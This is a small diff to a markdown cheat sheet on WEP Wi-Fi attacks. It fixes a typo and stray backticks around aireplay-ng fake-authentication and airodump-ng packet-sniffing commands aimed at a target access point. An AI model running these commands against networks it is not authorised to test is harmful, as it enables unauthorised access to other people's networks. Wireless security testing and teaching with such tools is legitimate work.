@@ -87,12 +87,12 @@ and if its in 2.4Ghz then remove the "-D"*}
 
 # Fake authentication attack (wep)
 
-*forcing AP to generate new packets with new IVs*``
+*forcing AP to generate new packets with new IVs*
 
 - `aireplay-ng --fakeauth 0 -a [network Mac add] -h[our Mac add] wlan0`
 
 - `airodump-ng --bssid XX:XX:XX:XX:XX:XX --channel x --write xxxx wlan0`
-(*sniffing target network with storing data and runnig parallely*)
+(*sniffing target network with storing data and running parallely*)
  
 - `aireplay-ng --fakeauth 0 -a XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0`
 (*0 for doing fake authentication attack once* )
